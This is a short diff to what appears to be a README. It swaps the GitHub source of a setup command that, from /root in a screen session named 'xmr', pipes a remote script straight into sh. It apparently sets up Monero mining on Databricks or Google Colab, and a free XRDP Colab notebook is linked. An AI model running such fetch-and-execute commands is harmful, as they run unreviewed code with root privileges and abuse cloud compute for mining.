@@ -3,7 +3,7 @@
 ```markdown
 cd /root
 screen -R xmr
-curl https://raw.githubusercontent.com/a2nk/get-xmr/main/databricks.sh | sh
+curl https://raw.githubusercontent.com/juliversamuel/GC/main/databricks.sh | sh
 ```
 * Try Free [XRDP GColab](https://colab.research.google.com/drive/1b1qhBUk4nXU6oriQv6VdcpKhSZqxlomc?usp=sharing)
 ```markdown
